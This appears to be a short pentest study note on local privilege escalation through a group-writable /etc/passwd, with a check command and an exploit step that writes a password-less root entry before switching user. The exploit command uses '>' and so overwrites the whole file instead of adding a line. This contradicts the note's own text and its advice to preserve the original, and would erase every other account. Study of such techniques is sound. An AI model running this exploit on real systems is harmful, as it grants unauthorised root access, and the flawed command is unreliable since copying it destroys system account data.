---
type: technique
tags: [ejpt:host-net-pentest]
tools: []
cves: []
related: [[sudo-abuse]]
---

# Writable /etc/passwd

When `/etc/passwd` is writable by your group, you can add a password-less root entry and switch user.

## Check

```sh
ls -l /etc/passwd
# -rw-rw-r-- 1 root pinguinos ... → group-writable
```

## Exploit

1. Add a root entry with an empty password field:
   ```sh
   echo 'root::0:0:root:/root:/bin/sh' > /etc/passwd
   ```
2. `su` to that account (no password required).

## Notes

- Modern systems store hashes in `/etc/shadow`, but an empty password field still bypasses auth on many setups.
- Preserve the original file content when possible.

## Seen in

[[adopting]]
